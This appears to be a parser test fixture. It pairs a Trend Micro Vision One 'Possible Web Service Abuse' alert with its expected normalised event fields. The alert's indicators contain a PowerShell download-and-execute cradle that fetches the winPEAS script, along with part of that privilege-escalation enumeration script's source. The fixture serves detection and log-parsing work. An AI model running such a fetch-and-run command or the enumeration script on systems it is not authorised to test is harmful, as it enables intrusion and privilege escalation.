{
  "input": {
    "message": "{\"schemaVersion\": \"1.15\", \"id\": \"WB-11111-22222222-00000\", \"investigationStatus\": \"New\", \"status\": \"Open\", \"investigationResult\": \"No Findings\", \"workbenchLink\": \"https://portal.eu.xdr.trendmicro.com/index.html#/workbench/alerts/WB-11111-22222222-00000\", \"alertProvider\": \"SAE\", \"modelId\": \"ce2af827-6dfc-4c5b-ab40-ab4b82351c83\", \"model\": \"Possible Web Service Abuse\", \"modelType\": \"preset\", \"score\": 39, \"severity\": \"medium\", \"createdDateTime\": \"2024-11-26T16:45:28Z\", \"updatedDateTime\": \"2024-11-26T16:45:28Z\", \"ownerIds\": [], \"impactScope\": {\"desktopCount\": 1, \"serverCount\": 0, \"accountCount\": 1, \"emailAddressCount\": 0, \"containerCount\": 0, \"cloudIdentityCount\": 0, \"entities\": [{\"entityType\": \"account\", \"entityValue\": \"windows10\\\\jdoe\", \"entityId\": \"windows10\\\\jdoe\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"relatedIndicatorIds\": [], \"provenance\": [\"Alert\"]}, {\"entityType\": \"host\", \"entityValue\": {\"guid\": \"e930412e-e09c-454b-a508-576ba266b9d8\", \"name\": \"windows10\", \"ips\": [\"20.193.45.33\"]}, \"entityId\": \"e930412e-e09c-454b-a508-576ba266b9d8\", \"relatedEntities\": [\"windows10\\\\jdoe\"], \"relatedIndicatorIds\": [1, 2, 3, 4, 5, 6, 7, 8, 9], \"provenance\": [\"Alert\"], \"managementScopeGroupId\": \"ce9c7ad6-f895-4907-bf57-e34b59d4dc90\"}]}, \"description\": \"The adversary attempted to download a payload stored on a legitimate external web service.\", \"matchedRules\": [{\"id\": \"ef13e37e-148e-48d6-819f-021f4acfcace\", \"name\": \"Suspicious Powershell Connection To Web Service\", \"matchedFilters\": [{\"id\": \"97e70752-3b27-4db0-b840-507d3f37ffe6\", \"name\": \"Suspicious Powershell Connection To Web Service - Variant 2\", \"matchedDateTime\": \"2024-11-26T16:42:29.602Z\", \"mitreTechniqueIds\": [\"T1102\"], \"matchedEvents\": [{\"uuid\": \"4aed361f-de80-4679-bf18-608b2afe5ff7\", \"matchedDateTime\": \"2024-11-26T16:42:29.602Z\", \"type\": \"TELEMETRY_AMSI\"}]}]}], \"indicators\": [{\"id\": 1, \"type\": \"amsi_rawDataStr\", \"field\": \"objectRawDataStr\", \"value\": \"IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 2, \"type\": \"amsi_rawDataStr\", \"field\": \"objectRawDataStr\", \"value\": \"<#\\n.SYNOPSIS\\n  PowerShell adaptation of WinPEAS.exe / WinPeas.bat\\n.DESCRIPTION\\n  For the legal enumeration of windows based computers that you either own or are approved to run this script on\\n.EXAMPLE\\n  # Default - normal operation with username/password audit in drives/registry\\n  .\\\\winPeas.ps1\\n\\n  # Include Excel files in search: .xls, .xlsx, .xlsm\\n  .\\\\winPeas.ps1 -Excel\\n\\n  # Full audit - normal operation with APIs / Keys / Tokens\\n  ## This will produce false positives ## \\n  .\\\\winPeas.ps1 -FullCheck \\n\\n  # Add Time stamps to each command\\n  .\\\\winPeas.ps1 -TimeStamp\\n\\n.NOTES\\n  Version:                    1.3\\n  PEASS-ng Original Author:   PEASS-ng\\n  winPEAS.ps1 Author:         @RandolphConley\\n  Creation Date:              10/4/2022\\n  Website:                    https://github.com/peass-ng/PEASS-ng\\n\\n  TESTED: PoSh 5,7\\n  UNTESTED: PoSh 3,4\\n  NOT FULLY COMPATIBLE: PoSh 2 or lower\\n#>\\n\\n######################## FUNCTIONS ########################\\n\\n[CmdletBinding()]\\nparam(\\n  [switch]$TimeStamp,\\n  [switch]$FullCheck,\\n  [switch]$Excel\\n)\\n\\n# Gather KB from all patches installed\\nfunction returnHotFixID {\\n  param(\\n    [string]$title\\n  )\\n  # Match on KB or if patch does not have a KB, return end result\\n  if (($title | Select-String -AllMatches -Pattern 'KB(\\\\d{4,6})').Matches.Value) {\\n    return (($title | Select-String -AllMatches -Pattern 'KB(\\\\d{4,6})').Matches.Value)\\n  }\\n  elseif (($title | Select-String -NotMatch -Pattern 'KB(\\\\d{4,6})').Matches.Value) {\\n    return (($title | Select-String -NotMatch -Pattern 'KB(\\\\d{4,6})').Matches.Value)\\n  }\\n}\\n\\nFunction Start-ACLCheck {\\n  param(\\n    $Target, $ServiceName)\\n  # Gather ACL of object\\n  if ($null -ne $target) {\\n    try {\\n      $ACLObject = Get-Acl $target -ErrorAction SilentlyContinue\\n    }\\n    catch { $null }\\n    \\n    # If Found, Evaluate Permissions\\n    if ($ACLObject) { \\n      $Identity = @()\\n      $Identity += \\\"$env:COMPUTERNAME\\\\$env:USERNAME\\\"\\n      if ($ACLObject.Owner -like $Identity ) { Write-Host \\\"$Identity has ownership of $Target\\\" -ForegroundColor Red }\\n      # This should now work for any language. Command runs whoami group, removes the first two line of output, converts from csv to object, but adds \\\"group name\\\" to the first column.\\n      whoami.exe /groups /fo csv | select-object -skip 2 | ConvertFrom-Csv -Header 'group name' | Select-Object -ExpandProperty 'group name' | ForEach-Object { $Identity += $_ }\\n      $IdentityFound = $false\\n      foreach ($i in $Identity) {\\n        $permission = $ACLObject.Access | Where-Object { $_.IdentityReference -like $i }\\n        $UserPermission = \\\"\\\"\\n        switch -WildCard ($Permission.FileSystemRights) {\\n          \\\"FullControl\\\" { $userPermission = \\\"FullControl\\\"; $IdentityFound = $true }\\n          \\\"Write*\\\" { $userPermission = \\\"Write\\\"; $IdentityFound = $true }\\n          \\\"Modify\\\" { $userPermission = \\\"Modify\\\"; $IdentityFound = $true }\\n        }\\n        Switch ($permission.RegistryRights) {\\n          \\\"FullControl\\\" { $userPermission = \\\"FullControl\\\"; $IdentityFound = $true }\\n        }\\n        if ($UserPermission) {\\n          if ($ServiceName) { Write-Host \\\"$ServiceName found with permissions issue:\\\" -ForegroundColor Red }\\n          Write-Host -ForegroundColor red  \\\"Identity $($permission.IdentityReference) has '$userPermission' perms for $Target\\\"\\n        }\\n      }    \\n      # Identity Found Check - If False, loop through and stop at root of drive\\n      if ($IdentityFound -eq $false) {\\n        if ($Target.Length -gt 3) {\\n          $Target = Split-Path $Target\\n          Start-ACLCheck $Target -ServiceName $ServiceName\\n        }\\n      }\\n    }\\n    else {\\n      # If not found, split path one level and Check again\\n      $Target = Split-Path $Target\\n      Start-ACLCheck $Target $ServiceName\\n    }\\n  }\\n}\\n\\nFunction UnquotedServicePathCheck {\\n  Write-Host \\\"Fetching the list of services, this may take a while...\\\";\\n  $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -inotmatch \\\"`\\\"\\\" -and $_.PathName -inotmatch \\\":\\\\\\\\Windows\\\\\\\\\\\" -and ($_.StartMode -eq \\\"Auto\\\" -or $_.StartMode -eq \\\"Manual\\\") -and ($_.State -eq \\\"Running\\\" -or $_.State -eq \\\"Stopped\\\") };\\n  if ($($services | Measure-Object).Count -lt 1) {\\n    Write-Host \\\"No unquoted service paths were found\\\";\\n  }\\n  else {\\n    $services | ForEach-Object {\\n      Write-Host \\\"Unquoted Service Path found!\\\" -ForegroundColor red\\n      Write-Host Name: $_.Name\\n      Write-Host PathName: $_.PathName\\n      Write-Host StartName: $_.StartName \\n      Write-Host StartMode: $_.StartMode\\n      Write-Host Running: $_.State\\n    } \\n  }\\n}\\n\\nfunction TimeElapsed { Write-Host \\\"Time Running: $($stopwatch.Elapsed.Minutes):$($stopwatch.Elapsed.Seconds)\\\" }\\nFunction Get-ClipBoardText {\\n  Add-Type -AssemblyName PresentationCore\\n  $text = [Windows.Clipboard]::GetText()\\n  if ($text) {\\n    Write-Host \\\"\\\"\\n    if ($TimeStamp) { TimeElapsed }\\n    Write-Host -ForegroundColor Blue \\\"=========|| ClipBoard text found:\\\"\\n    Write-Host $text\\n    \\n  }\\n}\\n\\nFunction Search-Excel {\\n  [cmdletbinding()]\\n  Param (\\n      [parameter(Mandatory, ValueFromPipeline)]\\n      [ValidateScript({\\n          Try {\\n              If (Test-Path -Path $_) {$True}\\n         \", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 3, \"type\": \"command_line\", \"field\": \"processCmd\", \"value\": \"\\\"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\PowerShell_ISE.exe\\\" \", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 4, \"type\": \"command_line\", \"field\": \"parentCmd\", \"value\": \"C:\\\\Windows\\\\Explorer.EXE\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 5, \"type\": \"file_sha256\", \"field\": \"processFileHashSha256\", \"value\": \"440C8F6BC2F87D1932261D8F49D014CA330BC49EEBEAEEE59DA61790A2910EAF\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 6, \"type\": \"fullpath\", \"field\": \"processFilePath\", \"value\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell_ise.exe\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 7, \"type\": \"process_id\", \"field\": \"processPid\", \"value\": \"5040\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 8, \"type\": \"process_id\", \"field\": \"parentPid\", \"value\": \"9920\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 9, \"type\": \"text\", \"field\": \"endpointHostName\", \"value\": \"Windows10\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}]}"
  },
  "expected": {
    "message": "{\"schemaVersion\": \"1.15\", \"id\": \"WB-11111-22222222-00000\", \"investigationStatus\": \"New\", \"status\": \"Open\", \"investigationResult\": \"No Findings\", \"workbenchLink\": \"https://portal.eu.xdr.trendmicro.com/index.html#/workbench/alerts/WB-11111-22222222-00000\", \"alertProvider\": \"SAE\", \"modelId\": \"ce2af827-6dfc-4c5b-ab40-ab4b82351c83\", \"model\": \"Possible Web Service Abuse\", \"modelType\": \"preset\", \"score\": 39, \"severity\": \"medium\", \"createdDateTime\": \"2024-11-26T16:45:28Z\", \"updatedDateTime\": \"2024-11-26T16:45:28Z\", \"ownerIds\": [], \"impactScope\": {\"desktopCount\": 1, \"serverCount\": 0, \"accountCount\": 1, \"emailAddressCount\": 0, \"containerCount\": 0, \"cloudIdentityCount\": 0, \"entities\": [{\"entityType\": \"account\", \"entityValue\": \"windows10\\\\jdoe\", \"entityId\": \"windows10\\\\jdoe\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"relatedIndicatorIds\": [], \"provenance\": [\"Alert\"]}, {\"entityType\": \"host\", \"entityValue\": {\"guid\": \"e930412e-e09c-454b-a508-576ba266b9d8\", \"name\": \"windows10\", \"ips\": [\"20.193.45.33\"]}, \"entityId\": \"e930412e-e09c-454b-a508-576ba266b9d8\", \"relatedEntities\": [\"windows10\\\\jdoe\"], \"relatedIndicatorIds\": [1, 2, 3, 4, 5, 6, 7, 8, 9], \"provenance\": [\"Alert\"], \"managementScopeGroupId\": \"ce9c7ad6-f895-4907-bf57-e34b59d4dc90\"}]}, \"description\": \"The adversary attempted to download a payload stored on a legitimate external web service.\", \"matchedRules\": [{\"id\": \"ef13e37e-148e-48d6-819f-021f4acfcace\", \"name\": \"Suspicious Powershell Connection To Web Service\", \"matchedFilters\": [{\"id\": \"97e70752-3b27-4db0-b840-507d3f37ffe6\", \"name\": \"Suspicious Powershell Connection To Web Service - Variant 2\", \"matchedDateTime\": \"2024-11-26T16:42:29.602Z\", \"mitreTechniqueIds\": [\"T1102\"], \"matchedEvents\": [{\"uuid\": \"4aed361f-de80-4679-bf18-608b2afe5ff7\", \"matchedDateTime\": \"2024-11-26T16:42:29.602Z\", \"type\": \"TELEMETRY_AMSI\"}]}]}], \"indicators\": [{\"id\": 1, \"type\": \"amsi_rawDataStr\", \"field\": \"objectRawDataStr\", \"value\": \"IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 2, \"type\": \"amsi_rawDataStr\", \"field\": \"objectRawDataStr\", \"value\": \"<#\\n.SYNOPSIS\\n  PowerShell adaptation of WinPEAS.exe / WinPeas.bat\\n.DESCRIPTION\\n  For the legal enumeration of windows based computers that you either own or are approved to run this script on\\n.EXAMPLE\\n  # Default - normal operation with username/password audit in drives/registry\\n  .\\\\winPeas.ps1\\n\\n  # Include Excel files in search: .xls, .xlsx, .xlsm\\n  .\\\\winPeas.ps1 -Excel\\n\\n  # Full audit - normal operation with APIs / Keys / Tokens\\n  ## This will produce false positives ## \\n  .\\\\winPeas.ps1 -FullCheck \\n\\n  # Add Time stamps to each command\\n  .\\\\winPeas.ps1 -TimeStamp\\n\\n.NOTES\\n  Version:                    1.3\\n  PEASS-ng Original Author:   PEASS-ng\\n  winPEAS.ps1 Author:         @RandolphConley\\n  Creation Date:              10/4/2022\\n  Website:                    https://github.com/peass-ng/PEASS-ng\\n\\n  TESTED: PoSh 5,7\\n  UNTESTED: PoSh 3,4\\n  NOT FULLY COMPATIBLE: PoSh 2 or lower\\n#>\\n\\n######################## FUNCTIONS ########################\\n\\n[CmdletBinding()]\\nparam(\\n  [switch]$TimeStamp,\\n  [switch]$FullCheck,\\n  [switch]$Excel\\n)\\n\\n# Gather KB from all patches installed\\nfunction returnHotFixID {\\n  param(\\n    [string]$title\\n  )\\n  # Match on KB or if patch does not have a KB, return end result\\n  if (($title | Select-String -AllMatches -Pattern 'KB(\\\\d{4,6})').Matches.Value) {\\n    return (($title | Select-String -AllMatches -Pattern 'KB(\\\\d{4,6})').Matches.Value)\\n  }\\n  elseif (($title | Select-String -NotMatch -Pattern 'KB(\\\\d{4,6})').Matches.Value) {\\n    return (($title | Select-String -NotMatch -Pattern 'KB(\\\\d{4,6})').Matches.Value)\\n  }\\n}\\n\\nFunction Start-ACLCheck {\\n  param(\\n    $Target, $ServiceName)\\n  # Gather ACL of object\\n  if ($null -ne $target) {\\n    try {\\n      $ACLObject = Get-Acl $target -ErrorAction SilentlyContinue\\n    }\\n    catch { $null }\\n    \\n    # If Found, Evaluate Permissions\\n    if ($ACLObject) { \\n      $Identity = @()\\n      $Identity += \\\"$env:COMPUTERNAME\\\\$env:USERNAME\\\"\\n      if ($ACLObject.Owner -like $Identity ) { Write-Host \\\"$Identity has ownership of $Target\\\" -ForegroundColor Red }\\n      # This should now work for any language. Command runs whoami group, removes the first two line of output, converts from csv to object, but adds \\\"group name\\\" to the first column.\\n      whoami.exe /groups /fo csv | select-object -skip 2 | ConvertFrom-Csv -Header 'group name' | Select-Object -ExpandProperty 'group name' | ForEach-Object { $Identity += $_ }\\n      $IdentityFound = $false\\n      foreach ($i in $Identity) {\\n        $permission = $ACLObject.Access | Where-Object { $_.IdentityReference -like $i }\\n        $UserPermission = \\\"\\\"\\n        switch -WildCard ($Permission.FileSystemRights) {\\n          \\\"FullControl\\\" { $userPermission = \\\"FullControl\\\"; $IdentityFound = $true }\\n          \\\"Write*\\\" { $userPermission = \\\"Write\\\"; $IdentityFound = $true }\\n          \\\"Modify\\\" { $userPermission = \\\"Modify\\\"; $IdentityFound = $true }\\n        }\\n        Switch ($permission.RegistryRights) {\\n          \\\"FullControl\\\" { $userPermission = \\\"FullControl\\\"; $IdentityFound = $true }\\n        }\\n        if ($UserPermission) {\\n          if ($ServiceName) { Write-Host \\\"$ServiceName found with permissions issue:\\\" -ForegroundColor Red }\\n          Write-Host -ForegroundColor red  \\\"Identity $($permission.IdentityReference) has '$userPermission' perms for $Target\\\"\\n        }\\n      }    \\n      # Identity Found Check - If False, loop through and stop at root of drive\\n      if ($IdentityFound -eq $false) {\\n        if ($Target.Length -gt 3) {\\n          $Target = Split-Path $Target\\n          Start-ACLCheck $Target -ServiceName $ServiceName\\n        }\\n      }\\n    }\\n    else {\\n      # If not found, split path one level and Check again\\n      $Target = Split-Path $Target\\n      Start-ACLCheck $Target $ServiceName\\n    }\\n  }\\n}\\n\\nFunction UnquotedServicePathCheck {\\n  Write-Host \\\"Fetching the list of services, this may take a while...\\\";\\n  $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -inotmatch \\\"`\\\"\\\" -and $_.PathName -inotmatch \\\":\\\\\\\\Windows\\\\\\\\\\\" -and ($_.StartMode -eq \\\"Auto\\\" -or $_.StartMode -eq \\\"Manual\\\") -and ($_.State -eq \\\"Running\\\" -or $_.State -eq \\\"Stopped\\\") };\\n  if ($($services | Measure-Object).Count -lt 1) {\\n    Write-Host \\\"No unquoted service paths were found\\\";\\n  }\\n  else {\\n    $services | ForEach-Object {\\n      Write-Host \\\"Unquoted Service Path found!\\\" -ForegroundColor red\\n      Write-Host Name: $_.Name\\n      Write-Host PathName: $_.PathName\\n      Write-Host StartName: $_.StartName \\n      Write-Host StartMode: $_.StartMode\\n      Write-Host Running: $_.State\\n    } \\n  }\\n}\\n\\nfunction TimeElapsed { Write-Host \\\"Time Running: $($stopwatch.Elapsed.Minutes):$($stopwatch.Elapsed.Seconds)\\\" }\\nFunction Get-ClipBoardText {\\n  Add-Type -AssemblyName PresentationCore\\n  $text = [Windows.Clipboard]::GetText()\\n  if ($text) {\\n    Write-Host \\\"\\\"\\n    if ($TimeStamp) { TimeElapsed }\\n    Write-Host -ForegroundColor Blue \\\"=========|| ClipBoard text found:\\\"\\n    Write-Host $text\\n    \\n  }\\n}\\n\\nFunction Search-Excel {\\n  [cmdletbinding()]\\n  Param (\\n      [parameter(Mandatory, ValueFromPipeline)]\\n      [ValidateScript({\\n          Try {\\n              If (Test-Path -Path $_) {$True}\\n         \", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 3, \"type\": \"command_line\", \"field\": \"processCmd\", \"value\": \"\\\"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\PowerShell_ISE.exe\\\" \", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 4, \"type\": \"command_line\", \"field\": \"parentCmd\", \"value\": \"C:\\\\Windows\\\\Explorer.EXE\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 5, \"type\": \"file_sha256\", \"field\": \"processFileHashSha256\", \"value\": \"440C8F6BC2F87D1932261D8F49D014CA330BC49EEBEAEEE59DA61790A2910EAF\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 6, \"type\": \"fullpath\", \"field\": \"processFilePath\", \"value\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell_ise.exe\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 7, \"type\": \"process_id\", \"field\": \"processPid\", \"value\": \"5040\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 8, \"type\": \"process_id\", \"field\": \"parentPid\", \"value\": \"9920\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}, {\"id\": 9, \"type\": \"text\", \"field\": \"endpointHostName\", \"value\": \"Windows10\", \"relatedEntities\": [\"e930412e-e09c-454b-a508-576ba266b9d8\"], \"filterIds\": [\"97e70752-3b27-4db0-b840-507d3f37ffe6\"], \"provenance\": [\"Alert\"]}]}",
    "event": {
      "category": [
        "intrusion_detection"
      ],
      "kind": "alert",
      "reason": "Possible Web Service Abuse",
      "type": [
        "info"
      ],
      "url": "https://portal.eu.xdr.trendmicro.com/index.html#/workbench/alerts/WB-11111-22222222-00000"
    },
    "@timestamp": "2024-11-26T16:45:28Z",
    "action": {
      "properties": {
        "ScriptBlockText": "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
      }
    },
    "host": {
      "id": "e930412e-e09c-454b-a508-576ba266b9d8",
      "ip": [
        "20.193.45.33"
      ],
      "name": "windows10"
    },
    "observer": {
      "product": "Vision One",
      "vendor": "TrendMicro"
    },
    "process": {
      "command_line": "\"C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe\" ",
      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
      "hash": {
        "sha256": "440C8F6BC2F87D1932261D8F49D014CA330BC49EEBEAEEE59DA61790A2910EAF"
      },
      "parent": {
        "command_line": "C:\\Windows\\Explorer.EXE",
        "pid": 9920
      },
      "pid": 5040
    },
    "related": {
      "hash": [
        "440C8F6BC2F87D1932261D8F49D014CA330BC49EEBEAEEE59DA61790A2910EAF"
      ],
      "ip": [
        "20.193.45.33"
      ],
      "user": [
        "jdoe"
      ]
    },
    "rule": {
      "name": "Possible Web Service Abuse"
    },
    "trendmicro": {
      "vision_one": {
        "alert_id": "WB-11111-22222222-00000",
        "investigation_status": "New",
        "severity": "medium",
        "status": "Open"
      }
    },
    "user": {
      "domain": "windows10",
      "id": "windows10\\jdoe",
      "name": "jdoe"
    }
  }
}